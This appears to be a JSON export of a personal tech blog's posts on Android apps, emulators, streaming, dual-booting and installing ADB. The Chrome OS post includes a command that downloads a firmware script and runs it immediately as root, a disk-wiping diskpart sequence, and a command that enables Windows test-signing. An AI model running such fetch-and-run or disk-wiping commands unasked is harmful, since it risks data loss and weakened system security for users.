        "content": "{{ youtube IbWyIl3yDus }}\r\n\r\nHave you ever thought about playing Pokemon on your Android Wear Smartwatch? Neither have I. However, an app called a href=\"https://play.google.com/store/apps/details?id=org.bostwickenator.android.weargbc\" target=\"_blank\"Wear GBC/a makes this all possible. It is a Gameboy color emulator for Android Wear.\r\n\r\n* *\r\n\r\nHow to Play Pokemon on Android Smartwatch\r\n\r\nHere&8217;s a quick tutorial on how I got this up and running. First download a GBC ROM (.gbc). Then add it via the phone app (you might have to unzip it first if it&#8217;s in a zip file). Then open up the app on your watch. It should appear in the list of ROMs to choose from.\r\n",
        "tags": [
            "android",
            "android wear",
            "emulation",
            "emulator",
            "gameboy",
            "gaming",
            "gbc",
            "pokemon",
            "smartwatch"
        ]
    },
    {
        "uri": "/replace-chrome-os-with-windows/",
        "title": "Replace Chrome OS with Windows",
        "content": "I love Chrome OS but I also realize that it&#8217;s pretty useless without an internet connection. Okay&#8230;maybe not pretty useless but mostly useless.  I can&#8217;t game, program or do anything useful on Chrome OS other than browse the web. Luckily, if you are using a Chromebook with an Intel CPU (sorry Samsung Chromebook users)  you can replace Chrome OS with Windows. Previously, I did a tutorial on a href=\"http://davebennett.tech/install-windows-10-on-chromebook/\" target=\"_blank\" rel=\"noopener\"How to install Windows on a Chromebook/a. I would recommend that you try that tutorial first because it involves a little less work and you&#8217;ll be able to go back to Chrome OS.\n\nspan style=\"color: 3366ff;\"Differences between a style=\"color: #3366ff;\" href=\"http://davebennett.tech/install-windows-10-on-chromebook/\" target=\"_blank\" rel=\"noopener\"How to Install Windows on a Chromebook/a and this tutorial:/span\n\nIn the first tutorial, I showed you how to install Windows without completely removing Chrome OS. Yes, Chrome OS was no longer installed but the stock firmware stayed intact. In my opinion, this is the preferable way to install Windows 10 on a Chromebook. However, in that tutorial I (mistakenly) assumed that everyone would have SeaBios installed on their Chromebook. Seabios is what would allow you to type in CRTL + L to boot from other devices after you enabled developer mode and USB booting. To my dismay, only some Chromebook models (such as my Acer 720) come with SeaBios pre-installed. Therefore, the previous tutorial will not work for every Chromebook model.\n\n{{ ad }}\n\nIn this tutorial, we are going to avoid SeaBios altogether. Instead, we are going to flash custom firmware that will allow you to boot Windows in UEFI mode (something seabios couldn&#8217;t do). The advantage is that you will be able to use things like the HDMI out, virtualization and other hardware features available to Windows. In addition, your Chromebook will essentially be wiped of any trace of Chrome OS and you can also get rid of that scary OS Verification screen that displays every time you boot your Chromebook. Essentially, flashing new firmware (Full ROM) means that your Chromebook can be used like a normal laptop with practically any operating system, including Mac OS. The disadvantage is that you won&#8217;t _easily_ be able to go back to Chrome OS. Got that? Good.\n\nWhat You Will Need:\n\n  Chromebook\n\n Step 1: Make Bootable USB Drive\n\nFirst, you need to make a bootable USB drive of Windows 10. I&#8217;m going to let you in on a little secret, you can still download the a href=\"https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewadvanced\" target=\"blank\" rel=\"noopener\"Windows 10 insider preview/a straight from Microsoft for free. Now use a program called a href=\"https://rufus.akeo.ie/\" target=\"blank\" rel=\"noopener\"Rufus /ato make the bootable USB drive. Make sure to set your partition scheme for GPT for UEFI.\n\nStep 2: Developer Mode\n\nNext, you need to a href=\"http://davebennett.tech/enable-developer-mode-on-chromebook/\" target=\"_blank\" rel=\"noopener\"enable developer mode/a on your Chromebook. You do not need to enable USB booting.\n\n Step 3: Write Protect Screw\n\n{{ ad }}\n\nThis step sounds really scary, but it&#8217;s not. Because you will be flashing a Full ROM firmware to your Chromebook, you will need to remove the write protect screw. Do a quick Google search to find where your write protect screw is located. On the Acer C720 it&#8217;s located near the SSD.\n\nStep 4: Flashing new Firmware\n\nNow we&8217;re at the fun step. Open up a Chrome window and hold CRTL + Alt + T to go into the terminal window. Type in the following:\n\npreshell/pre\n\nprecd; curl -L -O https://mrchromebox.tech/firmware-util.sh && sudo bash firmware-util.sh/pre\n\nThat will downlaod the firmware utility script. Once it runs, you should see a main window appear. Press option 3** to install the new firmware. Remember, **you will not be able to go back to Chrome OS&#8230;easily.\n\nWhen it ask you for the version of the bios, make sure you type in U. You want UEFI and not legacy (though you could use legacy and still be able to boot Chrome OS and Windows, but then&#8230;what&#8217;s the point of doing this whole tutorial? If that&#8217;s what you want to do, simply read through a href=\"http://davebennett.tech/enable-developer-mode-on-chromebook/\" target=\"_blank\" rel=\"noopener\"How to Install Windows 10 on a Chromebook/a. Ignore that whole statement if your Chromebook does not have seabios installed though).\n\nOnce it gets done, turn off your Chromebook.\n\n{{ ad }}\n\nStep 5: Windows Installation\n\nNow it&8217;s time to install Windows. Make sure the USB drive is inserted. You will also need to connect an external USB mouse and keyboard for the installation. Before you install windows, you must wipe your hard drive. Go to repair your computer.\n\nGo to troubleshoot, advanced and select command prompt. Type in the following:\n\npreDiskpart/pre\n\npreList Disk/pre\n\npreSelect Disk 0 (this could be different depending on your setup, but most likely will be 0. Your main HDD)/pre\n\npreclean/pre\n\nAfterward, reboot your computer and resume the installation.\n\nStep 6: Drivers\n\nSo a developer by the name of Coolstar wrote drivers for many Chromebook modules out there. I am going a href=\"https://coolstar.org/chromebook/windows-install.html\" target=\"_blank\" rel=\"noopener\"to link you to his website/a so that you can download his drivers and use the onboard trackpad and keyboard on your Chromebook.\n\nBefore you install the drivers though, open up command prompt and type in the following:\n\nprebcdedit -set testsigning on/pre\n\nThat&8217;s it! You have successfully replaced Chrome OS with Windows 10. Leave your thoughts and comments below!\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/01/rufus-1.png\n [2]: http://localhost/wordpress/wp-content/uploads/2017/01/Write-protect-screw-acer-c720-1.png\n",
        "tags": [
            "bios",
            "chrome os",
            "chromebook",
            "install windows 10",
            "install windows 10 on chromebook",
            "replace chrome os",
            "windows 10"
        ]
    },
    {
        "uri": "/stream-steam-games-android-2017/",
        "title": "Stream Steam Games to Android 2017",
        "content": "{{ youtube XQBTBsZZRTI }}\r\n\r\nIf all Android phones came with DirectX and desktop graphics, then playing native games would be a breeze. Unfortautnetly, that is far from the case. So while you might not be able to play Fallout 4 on android, there is nothing stopping you from streaming it to your device. Here&#8217;s how you can Stream Steams Games to Android.\r\n\r\nWhat You Will Need:\r\n\r\n  Nvidia 600 series or better graphics Card\r\n  a href=\"http://www.geforce.com/geforce-experience/download\" target=\"_blank\"GeForce Experience App/a\r\n  a href=\"https://play.google.com/store/apps/details?id=com.limelight\" target=\"_blank\"Moonlight/a\r\n\r\nspan style=\"color: 3366ff;\"emIf your graphics card doesn&#8217;t fit the requirements, then check out my other tutorial on how to a href=\"http://davebennett.tech/stream-steam-games-to-android/\" target=\"_blank\"Stream Steam Games to Android/a. That one uses a different method./em/span\r\n\r\nStream Steam Games to Android:\r\n\r\nFirst, download the moonlight app from the Play Store. Make sure that your phone and computer are on the same Wifi network.\r\n\r\nNext, on the GeForce app enable streaming in in the Shield tab.\r\n\r\nimg class=\"alignnone size-large wp-image-2048\" src=\"http://davebennett.tech/wp-content/uploads/2017/01/shield-streaming-1024x714.png\" alt=\"shield streaming\" width=\"810\" height=\"565\" srcset=\"http://localhost/wordpress/wp-content/uploads/2017/01/shield-streaming-1024x714.png 1024w, http://localhost/wordpress/wp-content/uploads/2017/01/shield-streaming-300x209.png 300w, http://localhost/wordpress/wp-content/uploads/2017/01/shield-streaming-768x536.png 768w, http://localhost/wordpress/wp-content/uploads/2017/01/shield-streaming.png 1216w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\r\n\r\nIn  the moonlight app, your computer should appear. When you select it, it will prompt you to enter in a pin on your desktop. Once the connection has been established, you can stream any game on your desktop to your Android device.\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2017/01/shield-streaming.png\r\n",
        "tags": [
            "android",
            "counter strike",
            "emulation",
            "gaming",
            "planetside 2",
            "shield",
            "stream",
            "stream steam games android"
        ]
    },
    {
        "uri": "/control-android-phone-without-touching/",
        "title": "Control your Android Phone without Touching It",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/lHNCrddQ-fg?rel=0\"/iframe\n/div\n\nIf you are looking for something cool to try, then download a href=\"https://play.google.com/store/apps/details?id=com.creasi.eviacam.service\" target=\"blank\"Eva Facial Mouse/a. This app allows you to control your android phone using your face. Using your face as an anchor point, the app moves the cursor on your phone relative to that point. Essentially, you are using your face to control the mouse pointer. While this is not something you should use in a practical setup, it&#8217;s still a cool app to show off to your friends.\n",
        "tags": [
            "android",
            "app",
            "cool app",
            "eva facial mouse",
            "face detection"
        ]
    },
    {
        "uri": "/top-7-android-apps-march-2017/",
        "title": "Top 7 Android Apps March 2017",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/YRyvh0Fiht4\"/iframe\n/div\n\nHere is my pick for top 7 Android apps for March 2017.\n\na href=\"https://play.google.com/store/apps/details?id=you.in.spark.energy\" target=\"_blank\"Energy Bar/a\n\nNo this is not a snack. This app will display your battery level as a small line above your status bar. You can adjust the thickness and position of the line. At first it&8217;s kinda distracting to look at, however, I&#8217;m quickly getting used it; I just love how subtle it is. I also think it&#8217;s easier to estimate my battery using this rather than looking at the battery icon in the status bar.\n\na href=\"https://play.google.com/store/apps/details?id=com.flyperinc.cornerfly\" target=\"_blank\"Cornerfly/a\n\nTime to cut corners (cue bad pun music). Cornify will round the edges of your screen. Honestly, I don&8217;t really think it makes your device look any better. But then again, I&#8217;m using a Galaxy S7 Edge, so I can&#8217;t see the corners regardless.\n\na href=\"https://play.google.com/store/apps/details?id=com.limi.baton\" target=\"_blank\"BatON/a\n\nimg class=\"alignleft wp-image-2074 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2017/03/Screenshot20170312-182421-169x300.png\" alt=\"BatON Screenshot\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182421-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182421-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182421-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182421.png 1440w\" sizes=\"(max-width: 169px) 100vw, 169px\" /This app is pure genius! It allows you to see the battery level of all of your Bluetooth connected devices. This is so helpful because I have Bluetooth headphones that have no battery indication whatsoever. It&8217;s always a guessing game in trying to decide whether or not they need to be charged soon. This app will work with almost any Bluetooth devices that support Bluetooth low energy profile.\n\n&nbsp;\n\na href=\"https://play.google.com/store/apps/details?id=com.rascarlo.quick.settings.tiles\" target=\"_blank\"Tiles/a\n\nimg class=\"alignleft wp-image-2073 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2017/03/Screenshot20170312-182509-169x300.png\" alt=\"Tiles Screenshot\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182509-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182509-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182509-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182509.png 1440w\" sizes=\"(max-width: 169px) 100vw, 169px\" /This app is only for devices running android Nougat (Android 7.0 +). It allows you to customize the quick tiles in your notification pull down. It also allows you to add your own tiles. I like how each of the tiles have their own custom action. For example, with the calendar tile I can either have it open my calendar or go straight to adding a new event.\n\n&nbsp;\n\n a href=\"https://play.google.com/store/apps/details?id=com.flyperinc.flyperlink\" target=\"_blank\"Flyperlink/a\n\nimg class=\"alignleft wp-image-2075 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2017/03/Screenshot20170312-182618-169x300.png\" alt=\"Flperlink Screenshot\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182618-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182618-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182618-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182618.png 1440w\" sizes=\"(max-width: 169px) 100vw, 169px\" /If you like the idea of facebook&#8217;s chat heads, then you might enjoy this app. Flyperlink allows you to open up web pages in their own window. All you need to do is share the link to the app and will launch its own &#8220;chat head.&#8221; It&#8217;s a great way to multitask while browsing the web. Unfortunately, any subsequent links will only open in new tabs within the existing floating bubble. I would rather it launch different bubbles for more links.\n\n&nbsp;\n\na href=\"https://play.google.com/store/apps/details?id=com.bleyl.recurrence\" target=\"_blank\"Recurrence/a\n\nimg class=\"alignleft wp-image-2077 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2017/03/Screenshot20170312-182652-169x300.png\" alt=\"Recurrence Screenshot\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182652-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182652-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182652-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182652.png 1440w\" sizes=\"(max-width: 169px) 100vw, 169px\" /This is another To-Do list app. It features &8220;nagging&#8221; reminders that will constantly bug you until you complete the task. It also has a fairly nice UI. Unfortunately, if you want to use the widget, you&#8217;re going to purchase the pro version.\n\n&nbsp;\n\n&nbsp;\n\na href=\"https://play.google.com/store/apps/details?id=com.libin.notification\" target=\"_blank\"Recent Notifications/a\n\nI img class=\"alignleft wp-image-2076 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2017/03/Screenshot20170312-182724-169x300.png\" alt=\"Recent Notifications Screenshot\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182724-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182724-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot20170312-182724-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182724.png 1440w\" sizes=\"(max-width: 169px) 100vw, 169px\" /hardly ever clear my notifications, and when I do, I get paranoid that I might have missed something. That&8217;s why recent notification is such a useful app. It allows you to go back and see all the notifications that you have received and possibly missed.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/03/Energy-Bar.png\n [2]: http://localhost/wordpress/wp-content/uploads/2017/03/Cornerfly.png\n [3]: http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182421.png\n [4]: http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182509.png\n [5]: http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182618.png\n [6]: http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182652.png\n [7]: http://localhost/wordpress/wp-content/uploads/2017/03/Screenshot_20170312-182724.png\n",
        "tags": [
            "android",
            "apps",
            "cornify",
            "energy bar",
            "link",
            "notification",
            "notifications",
            "recurrence",
            "tile",
            "top android apps"
        ]
    },
    {
        "uri": "/dual-boot-windows-10-and-ubuntu/",
        "title": "Dual Boot Windows 10 and Ubuntu",
        "content": "I woke up Sunday Morning with a cool project in mind. I wanted to dual boot Windows 10 and Ubuntu. The real reason for this was because I decided to give Jekyll a try and it was going to be my replacement for WordPress, but I digress. Another major reason to dual-boot Windows 10 and Ubuntu was so that I could keep all of my Android development and Web development stuff within Ubuntu and use Windows solely for video editing and gaming. So here&#8217;s how I did it:\n\ndiv class=\"alert alert-danger\"\n  strongMake sure that you backup everything before proceeding!/strong\n/div\n\nBuy New SSD\n\n{{ ad }}\n\nThis step is not necessary at all.However, I wanted to reinstall Windows to a larger SSD and use my existing one (that&8217;s currently running Windows) for Ubuntu. I purchased the a href=\"https://www.amazon.com/Samsung-2-5-Inch-Internal-MZ-75E250B-AM/dp/B00OAJ412U/ref=sr1_1?s=pc&ie=UTF8&qid=1489541211&sr=1-1&keywords=samsung+evo\" target=\"blank\" rel=\"noopener\"Samsung EVO SSD/a. The speeds are incredible for the price point and so far I have been very happy with it.\n\ndiv class=\"alert alert-info\"\n  I recommend that you install Windows before installing Ubuntu. It will make things easier for bootloader configuration\n/div\n\nReinstall Windows\n\nMicrosoft has made reinstalling Windows very easy. Assuming that you&8217;re currently running Windows, just go over and grab the media creation tool. It will make a bootable USB drive of Windows 10 for you. Alternatively, if you&#8217;re running Linux, you can download the iso. Once it&#8217;s complete, boot from the USB (go into your computer&#8217;s boot order and change to the USB). The installation for Windows it&#8217;s straightforward. Just follow the prompts and install.\n\nInstalling Ubuntu\n\nNow that Windows is installed, go to a href=\"https://www.ubuntu.com/download/desktop\" target=\"blank\" rel=\"noopener\"Ubuntu&8217;s website/a and download the ISO. Then use a program called a href=\"https://rufus.akeo.ie/\" target=\"blank\" rel=\"noopener\"Rufus/a to make a bootable USB drive. Once it&#8217;s complete, boot from the USB.\n\nUbuntu Installation Options\n\nBecause I&8217;m installing Ubuntu to a separate hard drive, I did not choose the option to install Ubuntu alongside Windows. This would have placed it on the same drive as Windows, which is not what I wanted. On the next screen, don&#8217;t get overwhelmed with the options. Simply locate your drive and create a new partition. You will need two partitions: root(/) and swap. Your swap should be anywhere between 1 &#8211; 8GB. The more RAM you have, the smaller it should be. The rest can be delegated to your root partition. Hit install and you&#8217;re good to go.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/03/media-creation-tool.png\n [2]: http://localhost/wordpress/wp-content/uploads/2017/03/rufus.png\n [3]: http://localhost/wordpress/wp-content/uploads/2017/03/ubuntu-root.png\n [4]: http://localhost/wordpress/wp-content/uploads/2017/03/ubuntu-swap.png\n",
        "tags": [
            "dual boot",
            "linux",
            "ubuntu",
            "ubuntu 16.04",
            "windows",
            "windows 10"
        ]
    },
    {
        "uri": "/whats-new-android-o/",
        "title": "What’s new in Android O?",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/QXUoncMkgQA\"/iframe\n/div\n\nGoogle has just released the details of Android 0, the next version of Android. So what&#8217;s new in Android O? You can find an overview of all the features over on the a href=\"https://developer.android.com/preview/api-overview.html\" target=\"_blank\"Android developer website/a. However, I want to share my favorite features slated to be in Android O.\n\nApp Auto Fill Framework\n\nThis new app autofill framework will allow users to select an app as their fill app. The fill app will be able to fill out forms and logins from other applications. For anyone who is familiar with a href=\"https://play.google.com/store/apps/details?id=com.lastpass.lpandroid\" target=\"_blank\"LastPass/a, you might be aware that they already do this. However, their implementation is buggy and requires the accessibility service to be enabled, which somehow always gets disabled for me. So I&8217;m really looking forward to apps like LastPass taking advantage of this to make logging into apps and websites easier.\n\nPicture in Picture Mode\n\nThis is not new to Android. Picture in Picture (PIP) mode has been in Android TV for quite some time now. However, Google is bringing it to mobile with Android O. In Android O, a user will be able to have a video play in the corner of their screen while they do other tasks on their device.\n\n Background Limits\n\nEvery year, Google makes another attempt alleviate the battery issues of Android. In Android Marshmallow and Nougat they introduced and refined Doze. In Android O, Google want&#8217;s to make apps that run in the background use less resources. Location apps that run in the background will only be able to get location updates a few times per each hour. Likewise, there will be extra limitations placed on the broadcast listeners that a background service can listen for.\n\nNotifications\n\nNotifications will also get a slight overhaul in Android O. Developers can now add more custom options to notifications such as a background color and timeout time. Users will be able to snooze notifications for later. In addition, there will now be notification channels. So if a user wants to block notifications from an app or subscribe to notifications, they can select the channel they want instead of the whole app.\n",
        "tags": [
            "android",
            "android o",
            "developer",
            "new",
            "preview"
        ]
    },
    {
        "uri": "/cheapest-computer-can-buy/",
        "title": "Cheapest Computer You Can Buy",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/Bj_9DaRSZxI\"/iframe\n/div\n\nIf you are in the market for a computer that will cost you about the same price as a large Starbucks iced coffee, then you are at the right place. Introducing, the Raspberry Pi Zero W. The Raspberry Pu Zero W is the cheapest computer you can buy. This computer isn&#8217;t made for gaming or bitcoin mining. It&#8217;s aimed at developers and enthusiasts to use in their projects. It would also make for a great setup for a small home server.\n\nRaspberry Pi Zero W Specs:\n\n  CPU: ARM11 running at 1GHz\n  RAM: 512 MB\n  WiFi: 2.4GHz 802.11n wireless LAN\n  Bluetooth: Bluetooth Classic 4.1 and Bluetooth LE\n\nSince the Pi is so small, there isn&#8217;t enough room to fit full sized ports. The Pi comes with a micro-usb and mini-hdmi port. This means that you will need to get adapters if you want to connect a full-sized USB device or HDMI monitor to the Pi.\n",
        "tags": [
            "cheap",
            "computer",
            "pi",
            "raspberry",
            "raspberry pi",
            "zero w"
        ]
    },
    {
        "uri": "/top-linux-apps/",
        "title": "Top Linux Apps",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/Y2Wam0K_0eU\"/iframe\n/div\n\nI spent a couple of months using Linux as my secondary operating system. During that time, I came across some really useful Linux apps that satisfied my needs. So here&#8217;s my list of the top Linux Apps.\n\nHTOP\n\nTo view the running tasks in Linux, all you need to do is open up a terminal window and type in the command top. This will give you a quick running view of all the active processes on your system. However, I find that this view is very boring. Therefore, I prefer to use an application called htop. Htop gives you a nice graphical view of all the active processes. It also throws in more colors and sorting options.\n\n Installation:\n\napt-get install htop\n\na href=\"https://code.visualstudio.com/download\" target=\"_blank\"Visual Studio Code/a\n\nI spent a lot of time doing web development in Linux. So I was working with php files, javascript, html, etc. My go to editor for all of this was visual studio code. Visual studio code features everything that other programs such as brackets and notepad++ have. I really like the dark UI design of visual studio code along with its vast extension support. It was really useful when working with Jekyll because I was able to add HTML Liquid tag support.\n\n a href=\"https://wereturtle.github.io/ghostwriter/\" target=\"_blank\"Ghostwriter/a\n\nGhostwriter is my go to markdown editor on Linux. I love the distraction free writing and its overall simplicity. This was very useful when working with the markdown posts of Jekyll.\n\na href=\"http://jonls.dk/redshift/\" target=\"_blank\"Redshift/a\n\nIt was really hard to find an application like flux. Sure, there is a flux for Linux, however, it didn&8217;t support the proprietary Nvidia drivers. So I ended up settling on Redshift. The app works well enough for my use. I did not spend the time to setup the scripts to trigger it automatically, instead I just toggled it on and off whenever I needed it. The red was a little too red for my liking, but it still got the job done.\n\nlm-sensors\n\nSo this is not really an app, but more of a package as part of the Linux operating system that you can install. Lm-sensors allows you to read your CPU temperature right from the terminal.\n\n installation:\n\nsudo apt-get install lm-sensors\n\nThen in terminal type in sudo sensors-detect\n\na href=\"https://launchpad.net/kazam\" target=\"_blank\"Kazam/a\n\nIf you are looking to do any kind of screen recording on Linux, then I recommend that you install Kazam. Kazam is by far the best screen recording software on Linux. It just works without any extra configuration. Also, it keeps the file size really small.\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "apps",
            "development",
            "linux",
            "terminal",
            "ubuntu"
        ]
    },
    {
        "uri": "/no-more-internet-privacy/",
        "title": "No More Internet Privacy",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/FHzso733ThE\"/iframe\n/div\n\nThis video is different that my usual content. In light of recent events, I wanted to highlight some of the concerns of privacy that is being challenged through companies and congress. I don&#8217;t want to persuade you either way, but I just want to make you an informed consumer as to what&#8217;s going on. There has been the recent incident of Verizon installing spyware on Android devices and the repeal of internet privacy laws (S.J.Res. 34) by the U.S. Congress. The question is whether people care that their privacy is compromised.\n\nPoints of interest:\n  \na href=\"https://www.govtrack.us/congress/votes/115-2017/h202\" target=\"_blank\"https://www.govtrack.us/congress/votes/115-2017/h202/a\n  \na href=\"https://www.eff.org/deeplinks/2017/03/first-horseman-privacy-apocalypse-has-already-arrived-verizon-announces-plans\" target=\"_blank\"https://www.eff.org/deeplinks/2017/03/first-horseman-privacy-apocalypse-has-already-arrived-verizon-announces-plans/a\n",
        "tags": [
            "blog",
            "discussion",
            "government",
            "internet",
            "privacy",
            "vpn"
        ]
    },
    {
        "uri": "/android-reverse-tether/",
        "title": "Android Reverse Tether",
        "content": "div class=\"embed-responsive embed-responsive-16by9\"\n  iframe class=\"embed-responsive-item\" src=\"\" width=\"300\" height=\"150\" allowfullscreen=\"allowfullscreen\" data-src=\"//www.youtube.com/embed/1XpKp-e0xkM\"/iframe\n/div\n\nThere might come a time when you need to access the internet from your phone, but you don&#8217;t have access to WiFi or mobile data. When that happens, Android Reverse Tether would be a useful thing to know. Reverse tethering means to share your computer internet connection with your phone (rather than the other way around). There are a couple of ways that you can do it. One way is to a href=\"https://www.davebennett.tech/share-internet-connection-windows/\" target=\"_blank\"create a WiFi hotspot from your computer./a For this tutorial, we are going to reverse tether via USB on Android.\n\ndiv class=\"alert alert-warning\"\n  You will need Android 5.0 or higher!\n/div\n\nWhat you will need:\n\n  a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html\" target=\"_blank\"Java Runtime Environment /a\n  a href=\"https://developer.android.com/studio/releases/platform-tools.htmldownload\" target=\"_blank\"Android Debug Tools Installed/a (ADB)\n  a href=\"https://git-scm.com/downloads\" target=\"_blank\"Git Bash/a (Only if you&#8217;re using Windows)\n  a href=\"https://github.com/Genymobile/gnirehtet\" target=\"_blank\"Gnirehtet/a\n\ndiv class=\"callout callout-info\"\n  h3\n    Android Debug Tools:\n  /h3\n  \n  p\n    You will need to make sure that you have ADB setup on your computer. If you do not have ADB installed,a href=\"https://www.davebennett.tech/how-to-install-adb/\" target=\"_blank\" follow my guide here/a.\n  /p\n/div\n\nSetup Android Reverse Tether:\n\nBegin by downloading a href=\"https://github.com/Genymobile/gnirehtet\" target=\"blank\"Gnirehtet/a. This is the application that will allow you to reverse tether your Android device. a class=\"link link link--darken link--darker u-baseColor--link\" dir=\"auto\" href=\"https://medium.com/@rom1v?source=postheaderlockup\" data-action=\"show-user-card\" data-action-source=\"postheaderlockup\" data-action-value=\"6540417ff22e\" data-action-type=\"hover\" data-user-id=\"6540417ff22e\"Romain Vimont/a, the developer of Gnirehtet, posted an interesting article about a href=\"https://medium.com/genymobile/gnirehtet-reverse-tethering-android-2afacdbdaec7\" target=\"blank\"how he developed this./a After you have downloaded Gnirehtet, unzip it to anywhere on your PC.\n\nNext, navigate to where you unzipped Gnirehtet. Right click and open up a new bash terminal.\n\nInside of the terminal type in: ./gnirehtet relay\n\nThat will start the service on your computer. Now open up a new bash window in the same directory. Make sure that your Android device is connected and USB debugging is enabled. Type in the following commands:\n\n./gnirehtet install\n\n./gnirehtet start\n\nThat will install the application to your Android device and start the service. There appears to be no launcher icon for the application, so you will not see it in your app drawer. Also, you will get a request on your Android device to set up a VPN connection; accept the request. You can confirm it&8217;s working by checking the previous bash window where you typed Gnirehtet relay. You should see the log of the packets, To stop the service when you&#8217;re done, type in: ./gnirehtet stop\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/04/Git-bash.png\n",
        "tags": [
            "android",
            "android reverse tether",
            "reverse",
            "share internet android",
            "share internet pc",
            "tether",
            "tether android"
        ]
    },
    {
        "uri": "/how-to-install-adb/",
        "title": "How to Install ADB",
        "content": "\n\nThe Android Development Bridge (ADB) is a vital part of Android App development, along with Android modding. Learning how to install ADB can help you later down the line. ADB allows you to access your Android phone via USB and issue commands to it. This can be really helpful for flashing roms, automated scripts or if your device is inaccessible through the normal Android interface. For this tutorial, we are going to focus on how to install ADB on Windows.\n\nStep 1:\n\nThe first thing that you need to do is download a href=\"https://developer.android.com/studio/releases/platform-tools.htmldownload\" target=\"blank\"the standalone ADB Zip file from Google/a. Unzip the file to any location on your computer. Preferably, you should keep in it a location that **you will not delete**. At this point, that&#8217;s all you need to do to get going with ADB. If you open up a command prompt and navigate to the current directory and type in _adb you should see a list of commands that you can use.\n\nBut, if you try using ADB outside of the current directory you&#8217;re in, Windows will not recognize the command. Therefore, it&#8217;s better to setup adb as a system variable so that it can be accessed from any location.\n\nStep 2:\n\nTo setup ADB as a system variable, hold down the Windows Key + S and search for System Variables. You should see an option to add or edit system variables.\n\nYou want to add another value to the path variable underneath System Variables.  Select path and then hit edit_._\n\nIn the following window hit new and type in the path to the adb folder that you unzipped in step 1. Then hit OK to save the changes.\n\nNow when you open up command prompt and type in adb you should see a list of commands and this will work no matter what directory that you are in.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2017/04/install-adb.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2017/04/adb-install.png\n [3]: http://localhost/wordpress/wp-content/uploads/2017/04/system-variables.png\n [4]: http://localhost/wordpress/wp-content/uploads/2017/04/adb-as-system-variables.png\n",
        "tags": [
            "adb windows",
            "android development bridge",
            "development",
            "install adb"
        ]
    },
    {
        "uri": "/lg-g6-unboxing/",
        "title": "LG G6 Unboxing",
